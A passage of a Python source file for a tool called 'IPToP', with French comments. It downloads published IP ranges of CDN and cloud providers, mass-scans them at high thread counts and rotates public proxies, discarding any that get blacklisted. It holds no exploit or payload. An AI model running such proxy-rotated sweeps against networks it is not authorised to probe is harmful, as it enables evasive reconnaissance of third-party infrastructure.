            # Vérifie s'il a été blacklisté
            if self.current_proxy in self.proxy_manager.proxies:
                self.usage_count += 1
                return self.current_proxy
            else:
                self.current_proxy = None
                self.usage_count = 0
                attempts += 1
                
    def current_proxy_info(self):
        if self.current_proxy:
            restantes = self.reuse_limit - self.usage_count
            return f"{self.current_proxy} | {restantes} utilisation(s) restante(s)"
        return "Aucun proxy actif"
        
        return None  # Aucun proxy valide trouvé
    
    def get_next_proxy(self):
        """Alias compatible pour éviter les erreurs dans d'autres appels"""
        return self.get_proxy()
    
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.last_update_time = 0
        self.update_interval = 3600  # 1 heure entre les mises à jour
        self.load_proxies()  # Chargement initial

    def get_best_proxies(self, limit=10):
        """Retourne les proxies valides triés par latence (si dispo)"""
        if not self.proxies:
            return []
    
        # Nettoyage : uniquement les URL sans métadonnées
        cleaned = [p.split("|")[0].strip() for p in self.proxies if isinstance(p, str)]
        return cleaned[:limit]

    def load_proxies(self):
        """Charge les proxies depuis le fichier avec vérification du format"""
        try:
            if not os.path.exists(PROXY_FILE):
                print(Fore.YELLOW + "ℹ Aucun fichier proxy trouvé. Téléchargement...")
                self.update_proxies()
                return

            with open(PROXY_FILE, 'r') as f:
                lines = [line.strip() for line in f if line.strip()]
                self.proxies = []
                
                for line in lines:
                    parts = line.split('|')
                    if len(parts) >= 1:
                        proxy_url = parts[0].strip()
                        if proxy_url.startswith('http'):
                            self.proxies.append(proxy_url)
                
            print(Fore.GREEN + f"✅ {len(self.proxies)} proxies chargés")
            
        except Exception as e:
            print(Fore.RED + f"❌ Erreur de chargement des proxies: {str(e)}")
            self.proxies = []

    def update_proxies(self):
        """Met à jour la liste des proxies"""
        with self.lock:
            print(Fore.CYAN + "🔄 Mise à jour des proxies...")
            update_proxy_file()  # Utilise la fonction existante
            self.load_proxies()  # Recharge les nouveaux proxies
            self.last_update_time = time.time()

    def get_next_proxy(self):
        """Obtient le prochain proxy valide"""
        with self.lock:
            if not self.proxies:
                self.update_proxies()
                if not self.proxies:
                    return None
            
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy

    def report_failure(self, proxy_url):
        """Signale un proxy défaillant"""
        with self.lock:
            if proxy_url in self.proxies:
                self.proxies.remove(proxy_url)
                print(Fore.YELLOW + f"⚠️ Proxy supprimé: {proxy_url}")
    
def monitor_proxy_usage(scanner):
    last_proxy_info = ""
    while scanner.scan_active:
        if scanner.proxy == "auto" and scanner.proxy_rotator:
            info = scanner.proxy_rotator.current_proxy_info()
            if info != last_proxy_info:
                print(Fore.MAGENTA + f"\n📊 Proxy info : {info}")
                last_proxy_info = info
        time.sleep(12)  # Moins fréquent Moins fréquent pour éviter la collision d'affichage

# === UTILITAIRE BGPVIEW.IO ===
import time

def fetch_cidrs_multi_asn(asns):
    """
    Récupère et fusionne les CIDR IPv4 de plusieurs ASN via l'API BGPView.io.
    Gère les erreurs, les structures inattendues et applique 3 tentatives par ASN.
    """
    print(Fore.CYAN + f"🔍 Récupération combinée des CIDR IPv4 pour ASN: {', '.join(map(str, asns))}...")
    all_cidrs = set()

    for asn in asns:
        success = False
        for attempt in range(3):
            try:
                url = f"https://api.bgpview.io/asn/{asn}/prefixes"
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                data = response.json()

                if isinstance(data, dict) and "data" in data and "ipv4_prefixes" in data["data"]:
                    cidrs = [entry["prefix"] for entry in data["data"]["ipv4_prefixes"] if "prefix" in entry]
                    print(Fore.GREEN + f"  ✅ ASN {asn} → {len(cidrs)} CIDR récupérées")
                    all_cidrs.update(cidrs)
                    success = True
                    break
                else:
                    print(Fore.YELLOW + f"  ⚠️ Réponse inattendue ou incomplète pour ASN {asn}")
                    break

            except Exception as e:
                if attempt < 2:
                    print(Fore.YELLOW + f"  ⏳ Réessai ASN {asn} ({attempt + 1}/3)...")
                    time.sleep(2)
                else:
                    print(Fore.RED + f"  ❌ ASN {asn} échoué après 3 tentatives : {e}")

        if not success:
            print(Fore.RED + f"  ❌ Abandon récupération ASN {asn}")

    print(Fore.GREEN + f"✅ Total unique CIDR : {len(all_cidrs)}")
    return list(all_cidrs)

def _is_valid_cidr(cidr: str) -> bool:
    """Valide une plage CIDR IPv4"""
    try:
        ipaddress.IPv4Network(cidr, strict=False)
        return True
    except ValueError:
        print(Fore.YELLOW + f"⚠️ CIDR invalide ignoré : {cidr}")
        return False

# ==============================================
# TEMPLATE GENERIQUE AMÉLIORÉ
# ==============================================
def _verify_cidr_file(provider_name: str, cidr_file: str, update_func: callable) -> bool:
    """Vérifie et met à jour le fichier CIDR avec gestion améliorée"""
    try:
        if not os.path.exists(cidr_file):
            print(Fore.YELLOW + f"ℹ Mise à jour initiale des CIDR {provider_name}...")
            if not update_func():
                print(Fore.RED + f"❌ Échec de l'initialisation de {provider_name}")
                return False
            
            # Vérification post-mise à jour
            if not os.path.exists(cidr_file):
                print(Fore.RED + "❌ Le fichier CIDR n'a pas été créé")
                return False
            
        # Validation rapide du contenu
        with open(cidr_file, 'r') as f:
            if not f.read(1):  # Vérifie que le fichier n'est pas vide
                print(Fore.YELLOW + "⚠️ Fichier CIDR vide, nouvelle tentative...")
                os.remove(cidr_file)
                return _verify_cidr_file(provider_name, cidr_file, update_func)
                
        return True
    except Exception as e:
        print(Fore.RED + f"❌ Erreur de vérification CIDR: {str(e)}")
        return False

def _display_provider_menu(provider_name: str) -> str:
    """Affiche un menu interactif enrichi"""
    menu_width = 40
    header = f" IPToP - {provider_name.upper()} "
    print(Fore.CYAN + "\n" + header.center(menu_width, "="))
    
    menu_items = [
        ("1", "🌐", "Nouveau scan complet"),
        ("2", "▶️", "Reprise du scan précédent"),
        ("3", "🔁", "Mise à jour des CIDR"),
        ("0", "↩️", "Retour")
    ]
    
    for num, icon, text in menu_items:
        print(Fore.LIGHTBLUE_EX + f" {num}. {icon} {text}")
    
    print(Fore.LIGHTBLUE_EX + "=" * menu_width)
    
    while True:
        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-3) : ").strip()
        if choice in ("0", "1", "2", "3"):
            return choice
        print(Fore.RED + "❌ Choix invalide. Veuillez saisir 0-3")

# ==============================================
# TEMPLATE GENERIQUE COMPATIBLE
# ==============================================
def _handle_new_scan(provider_name: str, cidr_file: str, progress_file: str, 
                   scan_func: callable, proxy: str):
    """Version simplifiée et compatible"""
    try:
        # Nettoyage standard
        if os.path.exists(progress_file):
            os.remove(progress_file)
        
        # Vérification basique
        if not os.path.exists(cidr_file):
            print(Fore.RED + "❌ Fichier CIDR manquant. Mise à jour requise.")
            return
        
        print(Fore.GREEN + f"\n⚡ Lancement du scan {provider_name}...")
        
        # Appel compatible avec vos fonctions existantes
        if proxy:
            scanner = scan_func(proxy=proxy)
        else:
            scanner = scan_func()
        
        if scanner:
            ask_for_rescan(scanner)
            
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur: {str(e)}")

def _handle_resume_scan(provider_name: str, progress_file: str, 
                      scan_func: callable, proxy: str):
    """Version basique compatible"""
    try:
        if not os.path.exists(progress_file):
            print(Fore.YELLOW + f"ℹ Aucune progression trouvée")
            return
        
        print(Fore.GREEN + f"\n⏯ Reprise du scan...")
        
        # Appel standard sans paramètres spéciaux
        if proxy:
            scanner = scan_func(resume=True, proxy=proxy)
        else:
            scanner = scan_func(resume=True)
        
        if scanner:
            ask_for_rescan(scanner)
            
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur: {str(e)}")

def _handle_cidr_update(provider_name: str, update_func: callable):
    """Mise à jour avec feedback détaillé"""
    print(Fore.CYAN + f"\n🔄 Début de la mise à jour des CIDR {provider_name}...")
    try:
        start_time = time.time()
        success = update_func()
        elapsed = time.time() - start_time
        
        if success:
            print(Fore.GREEN + f"✅ Mise à jour réussie en {elapsed:.2f}s")
        else:
            print(Fore.RED + f"❌ Échec après {elapsed:.2f}s")
            
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur de mise à jour: {str(e)}")

def _manage_scan_provider(provider_name: str, cidr_file: str, progress_file: str,
                        update_func: callable, scan_func: callable, proxy: str = None):
    """Template principal optimisé"""
    # Vérification initiale avec réessai
    if not _verify_cidr_file(provider_name, cidr_file, update_func):
        return

    while True:
        try:
            choice = _display_provider_menu(provider_name)
            
            if choice == "1":
                _handle_new_scan(provider_name, cidr_file, progress_file, scan_func, proxy)
            elif choice == "2":
                _handle_resume_scan(provider_name, progress_file, scan_func, proxy)
            elif choice == "3":
                _handle_cidr_update(provider_name, update_func)
            elif choice == "0":
                print(Fore.YELLOW + f"\nRetour au menu principal...")
                break
                
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n⏸ Interruption par l'utilisateur")
            break
        except Exception as e:
            print(Fore.RED + f"\n‼️ Erreur non gérée: {str(e)}")
            time.sleep(2)  # Pause avant de réafficher le menu
        
# ==============================================
# IMPLEMENTATIONS SPECIFIQUES
# ==============================================
def manage_cloudflare_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Cloudflare",
        cidr_file=CLOUDFLARE_CIDR_FILE,
        progress_file=CLOUDFLARE_SCAN_PROGRESS_FILE,
        update_func=update_cloudflare_cidrs,
        scan_func=start_cloudflare_scan,
        proxy=proxy
    )

def manage_cloudfront_scan(proxy=None):
    _manage_scan_provider(
        provider_name="CloudFront",
        cidr_file=CLOUDFRONT_CIDR_FILE,
        progress_file=CLOUDFRONT_SCAN_PROGRESS_FILE,
        update_func=update_cloudfront_cidrs,
        scan_func=start_cloudfront_scan,
        proxy=proxy
    )

def manage_googlecloud_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Google Cloud",
        cidr_file=GOOGLE_CIDR_FILE,
        progress_file=GOOGLE_SCAN_PROGRESS_FILE,
        update_func=update_googlecloud_cidrs,
        scan_func=start_googlecloud_scan,
        proxy=proxy
    )

def manage_fastly_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Fastly",
        cidr_file=FASTLY_CIDR_FILE,
        progress_file=FASTLY_SCAN_PROGRESS_FILE,
        update_func=update_fastly_cidrs,
        scan_func=start_fastly_scan,
        proxy=proxy
    )

def manage_akamai_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Akamai",
        cidr_file=AKAMAI_CIDR_FILE,
        progress_file=AKAMAI_SCAN_PROGRESS_FILE,
        update_func=update_akamai_cidrs,
        scan_func=start_akamai_scan,
        proxy=proxy
    )

def manage_azure_scan(proxy=None):
    """Gestion des scans Azure"""
    _manage_scan_provider(
        provider_name="Azure",
        cidr_file=AZURE_CIDR_FILE,
        progress_file=AZURE_SCAN_PROGRESS_FILE,
        update_func=update_azure_cidrs,
        scan_func=start_azure_scan,
        proxy=proxy
    )

def manage_stackpath_scan(proxy=None):
    """Gestion des scans StackPath"""
    _manage_scan_provider(
        provider_name="StackPath",
        cidr_file=STACKPATH_CIDR_FILE,
        progress_file=STACKPATH_SCAN_PROGRESS_FILE,
        update_func=update_stackpath_cidrs,
        scan_func=start_stackpath_scan,
        proxy=proxy
    )

def manage_bunny_scan(proxy=None):
    """Gère le menu de scan Bunny avec le template générique"""
    _manage_scan_provider(
        provider_name="Bunny",
        cidr_file=BUNNY_CIDR_FILE,
        progress_file=BUNNY_SCAN_PROGRESS_FILE,
        update_func=update_bunny_cidrs,
        scan_func=start_bunny_scan,
        proxy=proxy
    )

def manage_imperva_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Imperva",
        cidr_file=IMPERVA_CIDR_FILE,
        progress_file=IMPERVA_SCAN_PROGRESS_FILE,
        update_func=update_imperva_cidrs,
        scan_func=start_imperva_scan,
        proxy=proxy
    )

def manage_sucuri_scan(proxy=None):
    _manage_scan_provider(
        provider_name="Sucuri",
        cidr_file=SECURI_CIDR_FILE,
        progress_file=SECURI_SCAN_PROGRESS_FILE,
        update_func=update_sucuri_cidrs,
        scan_func=start_sucuri_scan,
        proxy=proxy
    )

def manage_gcore_scan(proxy=None):
    """Gestion des scans GCore avec style personnalisé"""
    # Configuration spécifique à GCore
    provider_config = {
        'name': "GCore",
        'color': Fore.LIGHTGREEN_EX,
        'icon': "🌍"
    }

    # Surcharge de l'affichage pour personnalisation
    def _display_gcore_menu():
        console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
        print(provider_config['color'] + f"\n{provider_config['icon']} {provider_config['name']} — MENU D'ANALYSE")
        print(provider_config['color'] + "=" * 40)
        print(Fore.CYAN + " 1. 🌐 Nouveau scan complet")
        print(Fore.CYAN + " 2. ▶️  Reprise du scan précédent")
        print(Fore.CYAN + " 3. 🔁 Mise à jour des CIDR")
        print(Fore.CYAN + " 0. ↩️  Retour")

    # Appel de la fonction générique avec menu personnalisé
    _manage_scan_provider(
        provider_name=provider_config['name'],
        cidr_file=GCORE_CIDR_FILE,
        progress_file=GCORE_SCAN_PROGRESS_FILE,
        update_func=update_gcore_cidrs,
        scan_func=start_gcore_scan,
        proxy=proxy
    )


# === FONCTIONS DE RÉCUPÉRATION CIDR ===
        
# ==============================================
# CONFIGURATION CLOUDFLARE
# ==============================================
CLOUDFLARE_CIDR_FILE = "cloudflare_cidrs.txt"
CLOUDFLARE_SCAN_PROGRESS_FILE = "cloudflare_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFLARE
# ==============================================
def fetch_cloudflare_cidrs(max_retries: int = 3, timeout: int = 15) -> list:
    """Récupère les plages CIDR Cloudflare avec gestion d'erreurs"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Cloudflare (API + ASN)...")
    cidrs = []
    
    # Fonction de validation interne
    def is_valid_cidr(cidr: str) -> bool:
        try:
            ipaddress.IPv4Network(cidr, strict=False)
            return True
        except ValueError:
            print(Fore.YELLOW + f"⚠️ CIDR invalide ignoré : {cidr}")
            return False

    # API Cloudflare
    for attempt in range(max_retries):
        try:
            response = requests.get('https://api.cloudflare.com/client/v4/ips', timeout=timeout)
            response.raise_for_status()
            data = response.json()
            
            if not data.get('success', False):
                raise ValueError("Réponse API invalide")
                
            api_cidrs = [cidr for cidr in data['result'].get('ipv4_cidrs', []) if is_valid_cidr(cidr)]
            cidrs.extend(api_cidrs)
            print(Fore.GREEN + f"  ✅ Cloudflare API → {len(api_cidrs)} CIDR")
            break
            
        except Exception as e:
            if attempt == max_retries - 1:
                print(Fore.RED + f"❌ Échec API après {max_retries} essais : {str(e)}")
            else:
                time.sleep(2 ** attempt)

    # Complément ASN
    try:
        asn_cidrs = [cidr for cidr in fetch_cidrs_multi_asn([13335]) if is_valid_cidr(cidr)]
        cidrs.extend(asn_cidrs)
        print(Fore.GREEN + f"  ✅ ASN 13335 → {len(asn_cidrs)} CIDR")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur ASN : {str(e)}")

    return sorted(list(set(cidrs))) if cidrs else []

def update_cloudflare_cidrs() -> bool:
    """Sauvegarde les CIDRs avec gestion d'erreurs sécurisée"""
    try:
        cidrs = fetch_cloudflare_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence
        if len(cidrs) < 10:  # Cloudflare a normalement >100 plages
            raise ValueError(f"Nombre suspect de CIDRs : {len(cidrs)}")

        # Sauvegarde atomique
        temp_path = f"{CLOUDFLARE_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(cidrs) + "\n")
            os.replace(temp_path, CLOUDFLARE_CIDR_FILE)
            print(Fore.GREEN + f"✅ {len(cidrs)} plages sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour : {str(e)}")
        return False

def scan_cloudflare_range(cidr, threads=100, proxy=None):
    """
    Version améliorée mais compatible du scanner Cloudflare
    Args:
        cidr (str): Plage CIDR à scanner (ex: '192.168.1.0/24')
        threads (int): Nombre de threads (défaut: 100)
        proxy (str): Proxy à utiliser (format: 'http://host:port')
    Returns:
        HostScanner: Votre instance de scanner configurée
    """
    print(Fore.MAGENTA + f"\n=== SCAN CLOUDFLARE DE {cidr} ===")
    print(Fore.CYAN + f"⚡ Threads: {threads} | Proxy: {'Oui' if proxy else 'Non'}")

    try:
        # Configuration optimisée pour Cloudflare
        scanner = HostScanner(
            filename=None,
            ip_range=cidr,
            threads=threads,
            ping_timeout=1.2,    # Légèrement augmenté
            http_timeout=8,      # Adapté aux services Cloudflare
            proxy=proxy,
            scan_ports=[80, 443] # Ports prioritaires
        )
        
        # Journalisation du démarrage
        start_time = time.time()
        print(Fore.YELLOW + f"⏳ Lancement du scan... (Timeout: {scanner.http_timeout}s)")
        
        scanner.run()
        
        # Affichage des stats
        elapsed = time.time() - start_time
        print(Fore.GREEN + f"✅ Scan terminé en {elapsed:.2f}s")
        print(Fore.BLUE + f"• IP testées: {len(scanner.scanned_ips)}")
        
        return scanner
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return scanner if 'scanner' in locals() else None
        
    except Exception as e:
        print(Fore.RED + f"❌ Erreur lors du scan: {str(e)}")
        return None

def start_cloudflare_scan(resume=False, proxy=None, threads=100, batch_size=5):
    """Lance le scan avec gestion de progression et parallélisation"""
    if not os.path.exists(CLOUDFLARE_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier {CLOUDFLARE_CIDR_FILE} introuvable")
        return False

    # Fonction de validation locale
    def is_valid_cidr(cidr):
        try:
            ipaddress.IPv4Network(cidr, strict=False)
            return True
        except ValueError:
            return False

    # Chargement avec vérification
    try:
        with open(CLOUDFLARE_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip() and is_valid_cidr(line.strip())]
    except Exception as e:
        print(Fore.RED + f"❌ Erreur lecture CIDR : {str(e)}")
        return False

    # Gestion de la progression
    scanned = set()
    if resume:
        try:
            with open(CLOUDFLARE_SCAN_PROGRESS_FILE, 'r') as f:
                scanned = {line.strip() for line in f if line.strip()}
        except FileNotFoundError:
            pass

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
    
    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages sont déjà scannées")
        return True

    print(Fore.CYAN + f"🌩 Début du scan ({len(to_scan)} plages) | Threads: {threads} | Proxy: {proxy or 'Aucun'}")

    # Scan par batch avec sauvegarde incrémentale
    try:
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== SCAN {i}/{len(to_scan)} : {cidr} ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(CLOUDFLARE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            if i % batch_size == 0:
                time.sleep(2)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return False
        
    return True

# ==============================================
# CONFIGURATION CLOUDFRONT
# ==============================================

CLOUDFRONT_CIDR_FILE = "cloudfront_cidrs.txt"
CLOUDFRONT_SCAN_PROGRESS_FILE = "cloudfront_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFRONT
# ==============================================

def fetch_cloudfront_cidrs(max_retries: int = 3, timeout: int = 15) -> list:
    """Récupère les plages CIDR CloudFront avec validation et retry"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR CloudFront...")
    
    def is_valid_aws_cidr(cidr: str) -> bool:
        """Valide les plages CIDR AWS spécifiques"""
        try:
            network = ipaddress.IPv4Network(cidr)
            return network.prefixlen >= 16  # Filtre les plages trop larges
        except ValueError:
            return False

    for attempt in range(max_retries):
        try:
            response = requests.get(
                'https://ip-ranges.amazonaws.com/ip-ranges.json',
                timeout=timeout
            )
            response.raise_for_status()
            
            data = response.json()
            cidrs = [
                prefix['ip_prefix'] for prefix in data.get('prefixes', [])
                if prefix.get('service') == 'CLOUDFRONT' 
                and is_valid_aws_cidr(prefix['ip_prefix'])
            ]
            
            if not cidrs:
                raise ValueError("Aucune plage CloudFront trouvée")
                
            print(Fore.GREEN + f"  ✅ {len(cidrs)} plages valides (essai {attempt + 1}/{max_retries})")
            return cidrs
            
        except Exception as e:
            if attempt == max_retries - 1:
                print(Fore.RED + f"❌ Échec après {max_retries} essais : {str(e)}")
            else:
                time.sleep(2 ** attempt)
    return []

def update_cloudfront_cidrs():
    """Sauvegarde les CIDRs avec vérification de base"""
    try:
        cidrs = fetch_cloudfront_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        temp_path = f"{CLOUDFRONT_CIDR_FILE}.tmp"
        with open(temp_path, 'w') as f:
            f.write("\n".join(cidrs) + "\n")
        
        os.replace(temp_path, CLOUDFRONT_CIDR_FILE)
        print(Fore.GREEN + f"✅ {len(cidrs)} plages sauvegardées")
        return True
        
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour: {str(e)}")
        if 'temp_path' in locals() and os.path.exists(temp_path):
            os.remove(temp_path)
        return False

def scan_cloudfront_range(cidr, threads=100, proxy=None):
    """
    Version améliorée mais compatible du scanner CloudFront
    Args:
        cidr (str): Plage CIDR à scanner (ex: '13.32.0.0/15')
        threads (int): Nombre de threads (défaut: 100)
        proxy (str/None): Proxy à utiliser (format: 'http://host:port')
    Returns:
        HostScanner: Votre instance de scanner configurée
    """
    print(Fore.MAGENTA + f"\n=== SCAN CLOUDFRONT DE {cidr} ===")
    print(Fore.CYAN + f"⚙️ Configuration: {threads} threads | Proxy: {'Oui' if proxy else 'Non'}")

    try:
        # Configuration optimisée pour CloudFront
        scanner = HostScanner(
            filename=None,
            ip_range=cidr,
            threads=threads,
            ping_timeout=0.8,  # Réduit car les POPs CloudFront répondent vite
            http_timeout=5,    # Timeout court adapté à CloudFront
            proxy=proxy,       # Support optionnel du proxy
            scan_ports=[80, 443]  # Ports par défaut CloudFront
        )
        
        # Journalisation du démarrage
        start_time = time.time()
        print(Fore.YELLOW + "⏳ Lancement du scan...")
        
        scanner.run()
        
        # Affichage des stats
        elapsed = time.time() - start_time
        print(Fore.GREEN + f"✅ Scan terminé en {elapsed:.2f}s")
        print(Fore.BLUE + f"• IP testées: {len(scanner.scanned_ips)}")
        
        return scanner
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return scanner if 'scanner' in locals() else None
    except Exception as e:
        print(Fore.RED + f"❌ Erreur lors du scan: {type(e).__name__} - {str(e)}")
        return None

def scan_googlecloud_range(threads: int = 100, 
                         proxy: Optional[str] = None, 
                         resume: bool = True,
                         batch_size: int = 10) -> bool:
    """
    Scan intelligent des plages Google Cloud en utilisant les CIDRs existants.
    
    Args:
        threads: Nombre de threads parallèles
        proxy: Configuration du proxy (optionnel)
        resume: Reprendre le scan précédent si True
        batch_size: Nombre de plages à scanner entre chaque pause
        
    Returns:
        bool: True si le scan complet est réussi, False sinon
    """
    # Vérification du fichier CIDR
    if not os.path.exists(GOOGLE_CIDR_FILE):
        print(Fore.RED + "❌ Fichier CIDR introuvable. Exécutez d'abord 'update_googlecloud_cidrs()'")
        return False

    try:
        # Chargement des CIDRs
        with open(GOOGLE_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
        
        # Gestion de la reprise
        scanned = set()
        if resume and os.path.exists(GOOGLE_SCAN_PROGRESS_FILE):
            with open(GOOGLE_SCAN_PROGRESS_FILE, 'r') as f:
                scanned = {line.strip() for line in f if line.strip()}
        
        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Toutes les plages Google Cloud sont déjà scannées")
            return True

        print(Fore.CYAN + f"\n☁️ Début du scan Google Cloud ({len(to_scan)} plages restantes)")
        print(Fore.YELLOW + f"⚙️ Configuration: {threads} threads | Proxy: {'Oui' if proxy else 'Non'}")

        # Journalisation du démarrage
        with open(GOOGLE_SCAN_PROGRESS_FILE, 'a') as f:
            f.write(f"\n# Nouveau scan démarré le {datetime.now().isoformat()}\n")

        # Scan par batch
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION: {i}/{len(to_scan)} - {cidr} ===")
            
            try:
                scanner = HostScanner(
                    ip_range=cidr,
                    threads=threads,
                    ping_timeout=1.2,
                    http_timeout=8,
                    proxy=proxy
                )
                scanner.run()
                
                # Sauvegarde de la progression
                with open(GOOGLE_SCAN_PROGRESS_FILE, 'a') as f:
                    f.write(f"{cidr}\n")
                    
                # Pause périodique pour réduire la charge
                if i % batch_size == 0:
                    time.sleep(1)
                    
            except Exception as e:
                print(Fore.RED + f"⚠️ Échec du scan de {cidr}: {str(e)}")
                continue
                
        print(Fore.GREEN + "\n✅ Scan Google Cloud terminé avec succès")
        return True

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return False
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique: {str(e)}")
        return False

def start_cloudfront_scan(resume=False, proxy=None, threads=100):
    """Lance le scan avec gestion améliorée de la progression"""
    # Vérification initiale
    if not os.path.exists(CLOUDFRONT_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier {CLOUDFRONT_CIDR_FILE} introuvable")
        return None

    try:
        # Chargement avec validation
        with open(CLOUDFRONT_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            
        # Gestion de la progression
        scanned = set()
        if resume and os.path.exists(CLOUDFRONT_SCAN_PROGRESS_FILE):
            with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'r') as f:
                scanned = {line.strip() for line in f if line.strip()}

        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Toutes les plages sont déjà scannées")
            return None

        print(Fore.CYAN + f"🚀 Scan CloudFront: {len(to_scan)} plages | Threads: {threads} | Proxy: {proxy or 'Aucun'}")

        # Journalisation de démarrage
        with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# Scan started at {datetime.now().isoformat()}\n")

        # Exécution du scan
        scanner = None
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION: {i}/{len(to_scan)} ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            # Sauvegarde incrémentale
            with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

        return scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique: {str(e)}")
        return None
        
def _clean_cloudfront_progress_file():
    """Nettoie le fichier de progression des commentaires"""
    if os.path.exists(CLOUDFRONT_SCAN_PROGRESS_FILE):
        with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'r+') as f:
            lines = [line for line in f if not line.startswith('#')]
            f.seek(0)
            f.writelines(lines)
            f.truncate()

# ==============================================
# CONFIGURATION GOOGLE CLOUD
# ==============================================
GOOGLE_CIDR_FILE = "cidrs/googlecloud_cidrs.txt"
GOOGLE_SCAN_PROGRESS_FILE = "progress/googlecloud_progress.txt"
# ==============================================
# FONCTIONS GOOGLE CLOUD
# ==============================================

def fetch_googlecloud_cidrs(max_retries: int = 3, timeout: int = 15) -> list:
    """Récupère les plages CIDR Google Cloud avec validation et mécanisme de retry"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Google Cloud (API + ASN)...")
    cidrs = []

    def is_valid_gcp_cidr(cidr: str) -> bool:
        """Valide les plages CIDR spécifiques à Google Cloud"""
        try:
            network = ipaddress.IPv4Network(cidr)
            return network.prefixlen >= 16  # Filtre les plages trop larges
        except ValueError:
            return False

    # API Google Cloud
    for attempt in range(max_retries):
        try:
            response = requests.get(
                "https://www.gstatic.com/ipranges/cloud.json",
                timeout=timeout
            )
            response.raise_for_status()
            
            data = response.json()
            api_cidrs = [
                item["ipv4Prefix"] for item in data.get("prefixes", [])
                if "ipv4Prefix" in item and is_valid_gcp_cidr(item["ipv4Prefix"])
            ]
            cidrs.extend(api_cidrs)
            print(Fore.GREEN + f"  ✅ Google API → {len(api_cidrs)} CIDR valides")
            break
            
        except Exception as e:
            if attempt == max_retries - 1:
                print(Fore.RED + f"❌ Échec API après {max_retries} essais : {str(e)}")
            else:
                time.sleep(2 ** attempt)

    # Complément ASN avec validation
    try:
        asn_cidrs = [
            cidr for cidr in fetch_cidrs_multi_asn([15169, 139070, 396982])
            if is_valid_gcp_cidr(cidr)
        ]
        cidrs.extend(asn_cidrs)
        print(Fore.GREEN + f"  ✅ ASN Google → {len(asn_cidrs)} CIDR supplémentaires")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Complément ASN partiel : {str(e)}")

    final = sorted(list(set(cidrs)))  # Déduplication + tri
    print(Fore.GREEN + f"✅ Total CIDR uniques Google Cloud : {len(final)}")
    return final

def update_googlecloud_cidrs() -> bool:
    """Sauvegarde atomique des CIDRs Google Cloud"""
    try:
        cidrs = fetch_googlecloud_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence (Google a normalement >100 plages)
        if len(cidrs) < 20:
            raise ValueError(f"Nombre suspect de CIDRs : {len(cidrs)}")

        # Création du dossier si inexistant
        os.makedirs(os.path.dirname(GOOGLE_CIDR_FILE), exist_ok=True)
        
        # Sauvegarde atomique
        temp_path = f"{GOOGLE_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(cidrs) + "\n")
